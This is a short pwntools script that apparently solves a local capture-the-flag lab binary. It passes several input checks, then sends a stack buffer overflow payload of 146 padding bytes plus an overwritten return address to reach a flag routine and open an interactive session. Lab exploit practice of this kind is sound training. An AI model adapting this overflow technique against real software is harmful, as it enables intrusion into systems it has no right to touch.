from pwn import *
p=process("./lab1")
p.sendlineafter(b"Pass Me?\n",str(0x31337))
p.sendlineafter(b"Big....\n","-1")
payload=b""
pswd="THISISNOTPASSWORD"
pswd_list= list(pswd)
i=0
while(i<17):
    pswd_list[i]=chr(ord(pswd_list[i])+10)
    i+=1

pswd=''.join(pswd_list)
payload=pswd
p.sendlineafter(b"Password\n",payload)
payload=b""
payload+=b"A"*146
payload+=p32(0x08049206)
p.sendlineafter(b"Password : ",payload)
p.recvuntil(b"Want?\n")
p.send("flag")
p.interactive()
